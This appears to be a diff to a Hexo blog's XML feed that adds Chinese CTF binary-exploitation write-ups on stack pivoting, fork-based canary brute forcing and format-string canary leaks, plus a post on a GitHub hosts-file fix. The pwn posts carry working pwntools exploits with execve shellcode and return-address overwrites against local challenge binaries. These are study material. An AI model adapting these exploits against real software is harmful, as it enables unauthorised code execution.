@@ -4,6 +4,83 @@
   
     
     <entry>
+      <title>Stack pivoting(栈翻转)</title>
+      <link href="/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/"/>
+      <url>/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/</url>
+      
+        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如其名，劫持栈指针指向攻击者能够控制的内存，再进行rop</p><p>利用情况：<br>1.可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链<br>2.开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。<br>3.其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</p><p>利用条件：<br>1.可以控制程序执行流。<br>2.可以控制 sp 指针。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>X-CTF Quals 2016 - b0verfl0w <a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/b0verfl0w">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/b0verfl0w</a></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20172429.png" alt="1"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20172349.png" alt="1"></p><p>存在栈溢出，但溢出后可供写入的字节数很少，考虑Stack pivoting</p><p>思路：往栈上写shellcode，再劫持esp到shellcode处</p><p>栈变化如下，其中padding为填充的垃圾数据<br>fgets读入数据后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174600.png" alt="1"><br>leave ret后，pop eip<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174739.png" alt="1"><br>eip执行jmp esp后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174816.png" alt="1"><br>eip执行sub esp, 0x28;jmp esp后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174840.png" alt="1"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86=asm(<span class="string">&quot;xor ecx, ecx;mul ecx&quot;</span>)</span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;push ecx;push 0x68732f2f&quot;</span>)  <span class="comment">#ecx--&gt;0</span></span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;push 0x6e69622f;mov ebx, esp&quot;</span>) <span class="comment">##两个0x 是binsh  ebx--&gt;binhsh</span></span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;mov al, 0xb;int 0x80&quot;</span>) <span class="comment"># eax--&gt; 0xb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode_x86=asm(&quot;xor ecx, ecx;mul ecx;push ecx;push 0x68732f2f;push 0x6e69622f;mov ebx, esp;mov al, 0xb;int 0x80&quot;)</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (<span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86)) * <span class="string">&#x27;b&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Stack </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 栈翻转 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>fork爆破canary</title>
+      <link href="/2024/08/05/%E7%88%86%E7%A0%B4canary/"/>
+      <url>/2024/08/05/%E7%88%86%E7%A0%B4canary/</url>
+      
+        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。</p><p>下面是爆破canary的模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io=process(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line">    <span class="comment">#libc=elf.libc</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">    <span class="comment">#libc=ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破canary的第&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;位&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前的字符为：&quot;</span>+<span class="built_in">chr</span>(i))</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) <span class="comment">#将canary转为bytes类型，避免后面的payload出现TypeError</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前payload为：&quot;</span>+<span class="built_in">str</span>(payload))</span><br><span class="line">        io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        data=io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            canary+=i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;canary is: &quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/bin1">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/bin1</a> 纯粹爆破题</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io=process(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line">    <span class="comment">#libc=elf.libc</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">    <span class="comment">#libc=ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破canary的第&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;位&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前的字符为：&quot;</span>+<span class="built_in">chr</span>(i))</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前payload为：&quot;</span>+<span class="built_in">str</span>(payload))</span><br><span class="line">        io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        data=io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            canary+=i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;canary is: &quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">getflag_addr=<span class="number">0x0804863B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(getflag_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Stack </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> canary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>格式化字符串漏洞覆盖canary</title>
+      <link href="/2024/08/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%A6%86%E7%9B%96canary/"/>
+      <url>/2024/08/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%A6%86%E7%9B%96canary/</url>
+      
+        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p><p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p><p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack&#x2F;buffer overflow 是否发生。</p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配</p><h2 id="利用格式化字符串漏洞绕过canary"><a href="#利用格式化字符串漏洞绕过canary" class="headerlink" title="利用格式化字符串漏洞绕过canary"></a>利用格式化字符串漏洞绕过canary</h2><p>倘若我们知道canar在栈上的位置，即可利用printf将其打印出来，在构造payload时填充进相应的位置，即可绕过canary保护</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>附件：<a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/binary_200">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/binary_200</a> </p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101017.png" alt="a"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101102.png" alt="a"><br>可以看到存在栈溢出，且有格式化字符串漏洞,且有后门函数<br>通过汇编我们可以得知canary的地址在esp+3Ch处<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101221.png" alt="a"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./binary_200&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%15$x&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x0804854D</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(shell)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Stack </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 格式化字符串漏洞 </tag>
+            
+            <tag> canary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SROP</title>
       <link href="/2024/08/04/srop/"/>
       <url>/2024/08/04/srop/</url>
@@ -257,6 +334,27 @@
     
     
     <entry>
+      <title>hexo推送文章失败解决方案</title>
+      <link href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><em>网上的一些常规解决方法可以先试试</em><br><em>这边记录一下试验成功的一个方法</em></p><p>往本地的host文件中添加GitHub的ip<br>格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140.82.114.4 github.com</span><br></pre></td></tr></table></figure><p><em>关于如何查GitHub的ip</em></p><p>可以使用在线的DNS解析工具<br>MXtoolbox (<a href="https://mxtoolbox.com/DNSLookup.aspx">https://mxtoolbox.com/DNSLookup.aspx</a>): MXtoolbox提供了各种网络工具，包括DNS解析工具。在其DNS Lookup页面上，你可以输入域名并选择查询类型（如A记录、CNAME记录、MX记录等），然后点击”DNS Lookup”按钮来执行DNS查询并获取IP地址。</p><p>DNS Checker (<a href="https://dnschecker.org/">https://dnschecker.org/</a>): DNS Checker是一个简单易用的在线DNS解析工具。你只需输入域名，选择查询类型，并点击”Go”按钮来进行DNS查询。它将显示相关的DNS记录，包括IP地址、TTL（Time To Live）值等。</p><p>DNS Lookup (<a href="https://dns-lookup.com/">https://dns-lookup.com/</a>): DNS Lookup提供了一个简单的界面来执行DNS查询。你可以输入域名并选择查询类型，然后点击”Lookup”按钮来获取IP地址和其他相关信息。</p><p>Network Tools by Google Cloud (<a href="https://toolbox.googleapps.com/apps/dig/">https://toolbox.googleapps.com/apps/dig/</a>): Google Cloud的Network Tools提供了各种网络工具，其中包括DIG工具用于执行DNS查询。你可以在该页面上输入域名并选择查询类型，然后点击”Run Query”来获取DNS记录和IP地址。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> github </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ret2csu</title>
       <link href="/2024/04/01/ret2csu/"/>
       <url>/2024/04/01/ret2csu/</url>
@@ -274,27 +372,6 @@
         <tags>
             
             <tag> ROP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>hexo推送文章失败解决方案</title>
-      <link href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
-      <url>/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
-      
-        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><em>网上的一些常规解决方法可以先试试</em><br><em>这边记录一下试验成功的一个方法</em></p><p>往本地的host文件中添加GitHub的ip<br>格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140.82.114.4 github.com</span><br></pre></td></tr></table></figure><p><em>关于如何查GitHub的ip</em></p><p>可以使用在线的DNS解析工具<br>MXtoolbox (<a href="https://mxtoolbox.com/DNSLookup.aspx">https://mxtoolbox.com/DNSLookup.aspx</a>): MXtoolbox提供了各种网络工具，包括DNS解析工具。在其DNS Lookup页面上，你可以输入域名并选择查询类型（如A记录、CNAME记录、MX记录等），然后点击”DNS Lookup”按钮来执行DNS查询并获取IP地址。</p><p>DNS Checker (<a href="https://dnschecker.org/">https://dnschecker.org/</a>): DNS Checker是一个简单易用的在线DNS解析工具。你只需输入域名，选择查询类型，并点击”Go”按钮来进行DNS查询。它将显示相关的DNS记录，包括IP地址、TTL（Time To Live）值等。</p><p>DNS Lookup (<a href="https://dns-lookup.com/">https://dns-lookup.com/</a>): DNS Lookup提供了一个简单的界面来执行DNS查询。你可以输入域名并选择查询类型，然后点击”Lookup”按钮来获取IP地址和其他相关信息。</p><p>Network Tools by Google Cloud (<a href="https://toolbox.googleapps.com/apps/dig/">https://toolbox.googleapps.com/apps/dig/</a>): Google Cloud的Network Tools提供了各种网络工具，其中包括DIG工具用于执行DNS查询。你可以在该页面上输入域名并选择查询类型，然后点击”Run Query”来获取DNS记录和IP地址。</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> hexo </tag>
-            
-            <tag> github </tag>
             
         </tags>
       
